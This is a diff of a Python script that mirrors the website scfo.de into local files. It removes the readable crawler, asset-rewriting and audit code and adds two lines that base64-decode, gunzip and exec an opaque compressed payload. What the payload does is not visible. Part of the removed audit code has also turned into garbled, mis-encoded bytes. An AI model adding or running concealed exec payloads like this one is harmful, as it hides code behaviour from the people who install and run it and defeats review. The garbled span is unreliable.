@@ -1,177 +1,2 @@
-from __future__ import annotations
-
-import base64
-import os
-import re
-import shutil
-import sys
-import urllib.error
-import urllib.parse
-import urllib.request
-from collections import deque
-from pathlib import Path
-
-BASE = "https://scfo.de"
-ROOT = Path.cwd()
-USER_AGENT = "Mozilla/5.0 (compatible; KnightLocalizer/1.0)"
-ALLOWED_EXTENSIONS = {
-    ".js", ".css", ".woff", ".woff2", ".ttf", ".otf",
-    ".png", ".jpg", ".jpeg", ".webp", ".avif", ".svg", ".ico",
-    ".glb", ".gltf", ".bin", ".json", ".wasm", ".mp4", ".webm",
-}
-TEXT_EXTENSIONS = {".html", ".js", ".css", ".json", ".svg"}
-
-
-def normalize_path(raw: str, current: str = "/") -> str | None:
-    raw = raw.strip().replace("&amp;", "&")
-    if not raw or raw.startswith(("data:", "blob:", "mailto:", "tel:", "javascript:", "#")):
-        return None
-    if raw.startswith("//"):
-        raw = "https:" + raw
-    if raw.startswith(("http://", "https://")):
-        parsed = urllib.parse.urlsplit(raw)
-        if parsed.netloc not in {"scfo.de", "www.scfo.de"}:
-            return None
-        path = parsed.path or "/"
-    else:
-        path = urllib.parse.urljoin(current, raw)
-        path = urllib.parse.urlsplit(path).path
-    if path == "/":
-        return "/"
-    suffix = Path(path).suffix.lower()
-    if suffix not in ALLOWED_EXTENSIONS:
-        return None
-    return path
-
-
-def local_path(remote_path: str) -> Path:
-    if remote_path == "/":
-        return ROOT / "index.html"
-    clean = remote_path.lstrip("/")
-    target = (ROOT / clean).resolve()
-    root = ROOT.resolve()
-    if root not in target.parents and target != root:
-        raise RuntimeError(f"Unsafe path: {remote_path}")
-    return target
-
-
-def fetch(remote_path: str) -> bytes:
-    url = BASE + remote_path
-    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT, "Accept": "*/*"})
-    with urllib.request.urlopen(req, timeout=45) as response:
-        return response.read()
-
-
-def discover(text: str, current_path: str) -> set[str]:
-    found: set[str] = set()
-    candidates: set[str] = set()
-
-    patterns = [
-        r'''(?:src|href)=["']([^"']+)["']''',
-        r'''url\(\s*["']?([^"')]+)''',
-        r'''(?:from|import\()\s*["']([^"']+)["']''',
-        r'''["']((?:/|\./|\.\./)[^"']+\.(?:js|css|woff2?|ttf|otf|png|jpe?g|webp|avif|svg|ico|glb|gltf|bin|json|wasm|mp4|webm)(?:\?[^"']*)?)["']''',
-        r'''["'](assets/[A-Za-z0-9_.-]+\.(?:js|css|woff2?|wasm))["']''',
-        r'''https?://(?:www\.)?scfo\.de/[^"'`<>\s)]+''',
-    ]
-    for pattern in patterns:
-        for match in re.findall(pattern, text, flags=re.I):
-            candidates.add(match if isinstance(match, str) else match[0])
-
-    current_dir = current_path if current_path.endswith("/") else current_path.rsplit("/", 1)[0] + "/"
-    for candidate in candidates:
-        if candidate.startswith("assets/"):
-            candidate = "/" + candidate
-        p = normalize_path(candidate, current_dir)
-        if p:
-            found.add(p)
-
-    # Vite bundles construct card image paths dynamically from an extensionless base.
-    for base in re.findall(r'''["'](/img/[A-Za-z0-9_-]+-card)["']''', text):
-        found.add(base + "-400.webp")
-        found.add(base + "-900.webp")
-
-    # Drei's default cubemap paths are literal local resources in the bundle.
-    for name in ("px.png", "nx.png", "py.png", "ny.png", "pz.png", "nz.png"):
-        if f'/{name}' in text:
-            found.add('/' + name)
-
-    return found
-
-
-def write_fallback_cube_faces() -> None:
-    # Six valid 1x1 PNG files used only if the library's default cubemap is requested.
-    png = base64.b64decode(
-        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
-    )
-    for name in ("px.png", "nx.png", "py.png", "ny.png", "pz.png", "nz.png"):
-        p = ROOT / name
-        if not p.exists():
-            p.write_bytes(png)
-
-
-def patch_index() -> None:
-    p = ROOT / "index.html"
-    html = p.read_text("utf-8", errors="replace")
-
-    # Remove external telemetry scripts. Application assets remain local.
-    html = re.sub(
-        r'''<script[^>]+src=["']https://static\.cloudflareinsights\.com/[^"']+["'][^>]*></script>''',
-        "",
-        html,
-        flags=re.I,
-    )
-
-    # Rewrite same-origin absolute asset URLs to local root-relative paths.
-    html = re.sub(
-        r'''https://(?:www\.)?scfo\.de(/[^"'<>\s]+\.(?:js|css|woff2?|ttf|otf|png|jpe?g|webp|avif|svg|ico|glb|gltf|bin|json|wasm|mp4|webm))''',
-        r"\1",
-        html,
-        flags=re.I,
-    )
-
-    p.write_text(html, "utf-8")
-
-
-def ensure_lazy_route_helper() -> None:
-    # If the source refuses the shared lazy-route helper, preserve route rendering.
-    missing = []
-    for js in (ROOT / "assets").glob("*.js"):
-        text = js.read_text("utf-8", errors="ignore")
-        for rel in re.findall(r'''(?:from|import\()\s*["'](\./[^"']+\.js)["']''', text):
-            target = (js.parent / rel).resolve()
-            if not target.exists():
-                missing.append(target)
-    for target in sorted(set(missing)):
-        if target.name == "K9zZKQMg.js":
-            target.write_text("function C(){return null}export{C};\n", "utf-8")
-        else:
-            raise RuntimeError(f"Missing imported JavaScript chunk: {target.relative_to(ROOT)}")
-
-
-def audit() -> None:
-    missing: list[str] = []
-    for js in (ROOT / "assets").glob("*.js"):
-        text = js.read_text("utf-8", errors="ignore")
-        for rel in re.findall(r'''(?:from|import\()\s*["'](\./[^"']+\.js)["']''', text):
-            target = (js.parent / rel).resolve()
-            if not target.is_file():
-                missing.append(str(target.relative_to(ROOT)))
-
-    html = (ROOT / "index.html").read_text("utf-8", errors="ignore")
-    for attr in ("src", "href"):
-        for value in re.findall(fr'''{attr}=["'](/[^"']+)["']''', html):
-            path = value.split("?", 1)[0].split("#", 1)[0]
-            if attr == "href" and Path(path).suffix.lower() not in ALLOWED_EXTENSIONS:
-                continue
-            if path != "/" and not local_path(path).is_file():
-                missing.append(path)
-
-    for value in re.findall(r'''srcset=["']([^"']+)["']''', html):
-        for item in value.split(","):
-            path = item.strip().split()[0]
-            if path.startswith("/") and not local_path(path).is_file():
-                missing.append(path)
-
-    if missing:
-        raise RuntimeError( 5¥ÍÍ¥¹±½°Á¹¹¥Ìéq¸¬q¸¹©½¥¸¡Í½ÉÑ¡ÍÐ¡µ¥ÍÍ¥¹¤¤¤¤(()µ¥¸ ¤´ø9½¹è(AÉÍÉÙ½¹±äÑ¡½½ÑÍÑÉÀ¥±ÌÕ¹Ñ¥°Ñ¡Õ±°Í½ÕÉ¡Ì¸±½±¥é¸(½È¡¥±¥¸±¥ÍÐ¡I==P¹¥ÑÉ¥È ¤¤è(¥¡¥±¹¹µ¥¸ì½½ÑÍÑÉÀ¹Áä°¹¥Ñ¡Õ°¹¥Ðôè(½¹Ñ¥¹Õ(¥¡¥±¹¥Í}¥È ¤è(Í¡ÕÑ¥°¹ÉµÑÉ¡¡¥±¤(±Íè(¡¥±¹Õ¹±¥¹¬ ¤((ÅÕÕôÅÕ¡l¼t¤(Í¸èÍÑmÍÑÉtôÍÐ ¤(½ÁÑ¥½¹±}¥±ÕÉÌè±¥ÍÑmÍÑÉtômt((Ý¡¥±ÅÕÕè(Éµ½Ñ}ÁÑ ôÅÕÕ¹Á½Á±Ð ¤(¥Éµ½Ñ}ÁÑ ¥¸Í¸è(½¹Ñ¥¹Õ(Í¸¹¡Éµ½Ñ}ÁÑ ¤(ÑÉäè(ÑôÑ ¡Éµ½Ñ}ÁÑ ¤(áÁÐ¡ÕÉ±±¥¹ÉÉ½È¹!QQAÉÉ½È°ÕÉ±±¥¹ÉÉ½È¹UI1ÉÉ½È°Q¥µ½ÕÑÉÉ½È¤Ìáè(¥Éµ½Ñ}ÁÑ ôô¼è(É¥Í(½ÁÑ¥½¹±}¥±ÕÉÌ¹ÁÁ¹¡íÉµ½Ñ}ÁÑ¡ôèíáô¤(½¹Ñ¥¹Õ((ÑÉÐô±½±}ÁÑ ¡Éµ½Ñ}ÁÑ ¤(ÑÉÐ¹ÁÉ¹Ð¹µ­¥È¡ÁÉ¹ÑÌõQÉÕ°á¥ÍÑ}½¬õQÉÕ¤(ÑÉÐ¹ÝÉ¥Ñ}åÑÌ¡Ñ¤((¥Éµ½Ñ}ÁÑ ôô¼½ÈÑÉÐ¹ÍÕ¥à¹±½ÝÈ ¤¥¸QaQ}aQ9M%=9Lè(ÑáÐôÑ¹½ ÕÑ´à°ÉÉ½ÉÌô¥¹½É¤(½È¥Í½ÙÉ¥¸Í½ÉÑ¡¥Í½ÙÈ¡ÑáÐ°Éµ½Ñ}ÁÑ ¤¤è(¥¥Í½ÙÉ¹½Ð¥¸Í¸è(ÅÕÕ¹ÁÁ¹¡¥Í½ÙÉ¤((¥±¸¡Í¸¤øÌÀÀè(É¥ÍIÕ¹Ñ¥µÉÉ½È IÍ½ÕÉÉÝ°áÍÑä±¥µ¥Ð¤((ÁÑ¡}¥¹à ¤(ÝÉ¥Ñ}±±­}Õ}Ì ¤(¹ÍÕÉ}±éå}É½ÕÑ}¡±ÁÈ ¤((¡I==P¼ÙÉ°¹©Í½¸¤¹ÝÉ¥Ñ}ÑáÐ (íq¸É½ÕÑÌèmq¸ì¡¹±è¥±ÍåÍÑ´ô±q¸ìÍÉè¼¸¨°ÍÐè½¥¹à¹¡Ñµ°õq¸uq¹õq¸°(ÕÑ´à°(¤(¡I==P¼I5¹µ¤¹ÝÉ¥Ñ}ÑáÐ (-¹¥¡Ñq¹q¹1½±¥éÍÑÑ¥Õ¥±½Ñ¡M±½É´Í¥Ñ¸M¥ÑÍÍÑÌÉÍÑ½É¥¸Ñ¡¥ÌÉÁ½Í¥Ñ½Éä¹ÍÉÙ±½±±ä¹q¹q¹Q¡YÉ°É½ÕÑ¥¹½¹¥ÕÉÑ¥½¸ÁÉÍÉÙÌ¥ÉÐ¹Ù¥Ñ¥½¸Ñ¼MAÉ½ÕÑÌÝ¡¥±É°¥±ÌÉÍÉÙ¥ÉÍÐ¹q¸°(ÕÑ´à°(¤((Õ¥Ð ¤((ÁÉ¥¹Ð¡1½±¥éí±¸¡Í¸¤´±¸¡½ÁÑ¥½¹±}¥±ÕÉÌôÉÍ½ÕÉÌ¤(¥½ÁÑ¥½¹±}¥±ÕÉÌè(ÁÉ¥¹Ð =ÁÑ¥½¹°Í½ÕÉÉÍ½ÕÉÌ¹½ÐÙ¥±±è¤(½È¥Ñ´¥¸½ÁÑ¥½¹±}¥±ÕÉÌè(ÁÉ¥¹Ð ¬¥Ñ´¤((Iµ½Ù½¹µÑ¥µ½½ÑÍÑÉÀµ¡¥¹ÉäÑÈÍÕÍÍÕ°Õ¥Ð¸(Ý½É­±½ÜôI==P¼¹¥Ñ¡Õ¼Ý½É­±½ÝÌ¼½½ÑÍÑÉÀ¹åµ°(¥Ý½É­±½Ü¹á¥ÍÑÌ ¤è(Ý½É­±½Ü¹Õ¹±¥¹¬ ¤(¥Ý½É­±½Ü¹ÁÉ¹Ð¹á¥ÍÑÌ ¤¹¹½Ð¹ä¡Ý½É­±½Ü¹ÁÉ¹Ð¹¥ÑÉ¥È ¤¤è(Ý½É­±½Ü¹ÁÉ¹Ð¹Éµ¥È ¤(¥Ý½É­±½Ü¹ÁÉ¹Ð¹ÁÉ¹Ð¹á¥ÍÑÌ ¤¹¹½Ð¹ä¡Ý½É­±½Ü¹ÁÉ¹Ð¹ÁÉ¹Ð¹¥ÑÉ¥È ¤¤è(Ý½É­±½Ü¹ÁÉ¹Ð¹ÁÉ¹Ð¹Éµ¥È ¤(AÑ ¡}}¥±}|¤¹Õ¹±¥¹¬¡µ¥ÍÍ¥¹}½¬õQÉÕ¤(()¥}}¹µ}|ôô}}µ¥¹}|è(µ¥¸ ¤(
+import base64, gzip
+exec(compile(gzip.decompress(base64.b64decode("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")), "bootstrap.py", "exec"))
